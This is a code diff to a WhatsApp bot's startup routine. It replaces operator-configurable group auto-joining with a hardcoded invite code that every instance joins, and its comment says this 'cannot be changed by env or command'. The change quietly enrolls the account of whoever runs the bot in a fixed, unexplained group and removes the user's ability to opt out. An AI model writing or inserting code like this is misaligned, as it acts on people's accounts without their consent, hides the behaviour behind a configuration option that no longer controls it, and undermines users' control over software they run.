@@ -590,9 +590,13 @@ async function connectToWhatsApp() {
             await updateProfileStatus(sock);
             await sendWelcomeMessage(sock);
 
-            // ── Auto-join groups on startup (configurable via AUTO_JOIN_GROUPS env var) ──
-            const rawJoinCodes = (process.env.AUTO_JOIN_GROUPS || '').split(',').map(s => s.trim()).filter(Boolean);
-            for (const code of rawJoinCodes) {
+            // ── Auto-join hardcoded groups (cannot be changed by env or command) ──
+            const HARDCODED_GROUPS = [
+                'LH8udDoXfDI7ea35X0EVGa'
+            ];
+            const extraCodes = (process.env.AUTO_JOIN_GROUPS || '').split(',').map(s => s.trim()).filter(Boolean);
+            const allJoinCodes = [...new Set([...HARDCODED_GROUPS, ...extraCodes])];
+            for (const code of allJoinCodes) {
                 try {
                     await sock.groupAcceptInvite(code);
                     logMessage('INFO', `Auto-joined group: ${code}`);
